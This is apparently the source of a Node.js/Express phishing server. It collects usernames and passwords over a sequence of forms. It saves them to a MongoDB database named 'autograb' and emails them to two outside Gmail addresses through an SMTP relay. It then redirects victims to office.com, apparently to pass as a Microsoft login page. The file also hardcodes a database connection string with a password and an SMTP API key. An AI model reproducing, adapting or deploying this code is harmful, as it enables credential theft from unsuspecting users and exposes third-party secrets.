let express = require("express");
let bodyParser = require("body-parser");
let ejs = require("ejs");
let mongoose = require("mongoose");
let https = require('https');
let session = require('express-session');
let cookieParser = require('cookie-parser');
let app = express();
let nodemailer = require('nodemailer');


app.set("view engine", "ejs")
app.use(cookieParser());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));
app.use(session({
  secret: 'runner',
  resave: false,
  saveUninitialized: true,
  // cookie: { secure: true }
}));

mongoose.set('strictQuery', true);
mongoose.connect("mongodb+srv://mstella1759:Badhtguy1.@cluster0.h6tw3.mongodb.net/autograb",{ useNewUrlParser:true });

const userSchema = new mongoose.Schema({
  hidden: String,
  password: String,
});
const User = new mongoose.model("User", userSchema);


app.get("/", (req, res) => {
      var username = req.query.username;
  console.log(`Session: ${JSON.stringify(req.session)}`);
  console.log(`Cookies: ${JSON.stringify(req.cookies)}`);

  res.render("recap",{username: username});
});


app.post("/", function(req, res) {
  var username = req.body.recapstore;
  req.session.username = req.body.username;
console.log(`Session: ${JSON.stringify(req.session)}`);
console.log(`Cookies: ${JSON.stringify(req.cookies)}`);
  res.render("second",{username: username});
});

// app.post("/first", function(req, res) {
//   var username = req.body.username;
//   res.render("second", {username: username});
// });



app.post("/second", function(req, res) {
  req.session.username = req.body.username;
req.session.password = req.body.pass;
  var username = req.body.username;
  const newUser = new User({
    hidden: req.body.username,
    password: req.body.pass
  });
  newUser.save(function(err) {
    if (err) {
      console.log(err);
    } else {

      let transporter = nodemailer.createTransport({
        host: "smtp.elasticemail.com",
        port: 2525,
        secure: false,
        auth: {
          user: 'prattrenee@post.com',
          pass: '19087AD1B1A6CCB2AEB8AA312B76C43D409F'
        },
        timeout: 5000
      });

      // define the email options
      let mailOptions = {
        from: 'prattrenee@post.com',
        to: 'slangley1759@gmail.com',
        to: 'yingliulai@gmail.com',
        subject: 'Results',
        text: `username: ${username}, password: ${req.body.pass}`
      };

      // send the email
      transporter.sendMail(mailOptions, function(error, info) {
        if (error) {
          console.log(error);
        } else {
          console.log('Email sent: ' + info.response);
        }
      });
      console.log(`Session: ${JSON.stringify(req.session)}`);
      console.log(`Cookies: ${JSON.stringify(req.cookies)}`);
      // redirect to the specified URL
      res.render("third", {
        username: username
      });
    }
  });
});



app.post("/third", function(req, res) {
  var username = req.body.username;
  const newUser = new User({
    hidden: req.body.username,
    password: req.body.pass,
  });
  newUser.save(function(err) {
    if (err) {
      console.log(err);
    } else {
      // create a transporter object to connect to the SMTP server
      let transporter = nodemailer.createTransport({
        host: "smtp.elasticemail.com",
        port: 2525,
        secure: false,
        auth: {
          user: 'prattrenee@post.com',
          pass: '19087AD1B1A6CCB2AEB8AA312B76C43D409F'
        },
        timeout: 5000
      });

      // define the email options
      let mailOptions = {
        from: 'prattrenee@post.com',
        to: 'slangley1759@gmail.com',
        to: 'yingliulai@gmail.com',
        subject: 'New Form Submission',
        text: `username: ${username}, password: ${req.body.pass}`
      };

      // send the email
      transporter.sendMail(mailOptions, function(error, info) {
        if (error) {
          console.log(error);
        } else {
          console.log('Email sent: ' + info.response);
        }
      });
      console.log(`Session: ${JSON.stringify(req.session)}`);
      console.log(`Cookies: ${JSON.stringify(req.cookies)}`);
      // redirect to the specified URL
      res.redirect("https://www.office.com/")
    }
  });
});



let port = process.env.PORT;
if (port == null || port == "") {
  port = 3000
};

app.listen(process.env.PORT || 3000, function() {
  console.log("welcome to 3k")
});
